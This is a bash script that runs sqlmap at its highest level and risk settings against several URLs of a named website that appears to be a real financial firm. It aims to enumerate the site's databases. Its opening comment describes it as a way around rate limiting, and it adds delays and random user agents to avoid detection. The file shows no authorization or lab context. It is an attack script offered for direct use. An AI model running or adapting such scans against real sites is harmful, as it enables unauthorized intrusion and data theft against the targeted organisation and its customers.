#!/bin/bash
# Anti-rate-limit: sequential sqlmap over each real parameter, ~1 req/sec via sqlmap delay
T="https://www.infinitycapital.bh"
mkdir -p sqlo
run () {
  name="$1"; url="$2"
  echo "############ SQLMAP $name : $url"
  sqlmap -u "$url" --batch --level=5 --risk=3 --dbs --threads=4 --delay=0.4 \
    --random-agent --output-dir="$PWD/sqlo" 2>&1 | tail -30
  echo "############ END $name"
}
run home_page  "https://www.infinitycapital.bh/?id=1&search=test&page=2"
run home_page2 "https://www.infinitycapital.bh/?page=2"
run home_id    "https://www.infinitycapital.bh/?id=1"
run home_zzz   "https://www.infinitycapital.bh/?zzz=1"
run contact_cb "https://www.infinitycapital.bh/contact?cb=1"
run contact_x  "https://www.infinitycapital.bh/contact?x=1"
